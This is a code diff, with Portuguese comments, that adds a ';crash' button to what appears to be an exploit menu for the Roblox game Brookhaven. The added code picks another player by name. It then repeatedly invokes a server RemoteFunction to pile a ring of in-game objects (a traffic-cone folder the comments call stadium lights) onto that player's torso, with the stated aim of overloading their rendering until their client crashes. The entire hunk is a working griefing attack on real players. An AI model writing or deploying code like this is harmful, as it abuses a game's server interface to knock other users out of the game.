@@ -607,3 +607,87 @@ MainTab:Button({
         end
     end
 })
+
+MainTab:Button({
+    Title = ";crash",
+    Callback = function()
+        if AlvoSelecionado == "" then
+            WindUI:Notify({Title = "⚠️ Requisito", Content = "Defina um alvo primeiro na fila administrativa.", Duration = 4})
+            return
+        end
+
+        local Players = game:GetService("Players")
+        local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
+        
+        local targetPlayer = nil
+        for _, player in pairs(Players:GetPlayers()) do
+            if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
+                targetPlayer = player
+                break
+            end
+        end
+        
+        if not targetPlayer or not targetPlayer.Character then
+            WindUI:Notify({Title = "❌ Erro Admin", Content = "Alvo inválido ou não carregado.", Duration = 3})
+            return
+        end
+
+        -- Altere para o nome exato da pasta onde o Brookhaven guarda os novos Stadium Lights
+        local pastaPostes = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones") 
+        if not pastaPostes then
+            WindUI:Notify({Title = "❌ Erro Admin", Content = "Pasta de Holofotes não mapeada.", Duration = 3})
+            return
+        end
+
+        WindUI:Notify({
+            Title = "🛡️ Painel Admin", 
+            Content = "Alinhando holofotes e forçando colapso de GPU em " .. targetPlayer.Name .. "...", 
+            Duration = 3
+        })
+
+        local character = targetPlayer.Character
+        -- Focamos no peito (UpperTorso) ou cabeça, garantindo que o feixe de luz corte a lente da câmera dele
+        local targetCenter = character:FindFirstChild("UpperTorso") or character:FindFirstChild("HumanoidRootPart")
+        local postes = pastaPostes:GetChildren()
+        
+        if targetCenter and #postes > 0 then
+            -- Ativa a sobrecarga em threads assíncronas controladas
+            task.spawn(function()
+                pcall(function()
+                    -- Roda um bombardeio contínuo curto para garantir o travamento até o processo fechar
+                    for loop = 1, 10 do
+                        if not targetPlayer or not targetPlayer.Parent then break end
+                        
+                        for i, poste in pairs(postes) do
+                            local setCFrameRemote = poste:FindFirstChild("SetCurrentCFrame")
+                            if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
+                                
+                                task.spawn(function()
+                                    pcall(function()
+                                        -- MATEMÁTICA DE ALINHAMENTO COMPACTO:
+                                        -- Distribuímos os 15 postes em um anel bem apertado ao redor do alvo
+                                        local raioApertado = 3 -- Mantém os postes colados nele para engolir a câmera
+                                        local radianos = (i * (math.pi * 2 / #postes)) + (tick() * 5) -- Gira levemente para flutuar as sombras
+                                        
+                                        local offsetX = math.cos(radianos) * raioApertado
+                                        local offsetZ = math.sin(radianos) * raioApertado
+                                        local offsetY = 5 -- Posiciona os holofotes ligeiramente acima para apontarem para baixo
+                                        
+                                        local posicaoPoste = targetCenter.Position + Vector3.new(offsetX, offsetY, offsetZ)
+                                        
+                                        -- CFrame.lookAt força o poste (e o cone de luz dele) a mirar exatamente no peito do alvo
+                                        local destinoAlinhado = CFrame.lookAt(posicaoPoste, targetCenter.Position)
+                                        
+                                        setCFrameRemote:InvokeServer(destinoAlinhado)
+                                    end)
+                                end)
+                                
+                            end
+                        end
+                        task.wait(0.05) -- Delay cirúrgico para inundar a renderização sem travar você
+                    end
+                end)
+            end)
+        end
+    end
+})
